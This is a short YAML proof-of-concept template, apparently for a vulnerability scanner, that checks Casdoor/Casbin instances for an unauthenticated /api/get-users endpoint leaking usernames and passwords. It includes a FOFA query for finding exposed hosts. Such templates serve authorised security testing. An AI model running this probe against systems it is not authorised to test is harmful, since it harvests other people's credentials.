id: poc-yaml-casbin-get-users-user-password-leak
info:
  name: Casbin get-users 账号密码泄漏漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: Casbin
  fofa: title="Casdoor"
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(title,"Casdoor")
- method: GET
  path: /api/get-users?p=123&pageSize=123
  expression: status_code == 200 && matches(body,"\"name\"\x3a \"([0-9a-zA-Z]+)\"")
    && matches(body,"\"password\"\x3a \"([0-9a-zA-Z/]+)\"") && contains(content_type,"application/json")
variables: {}
transport: http
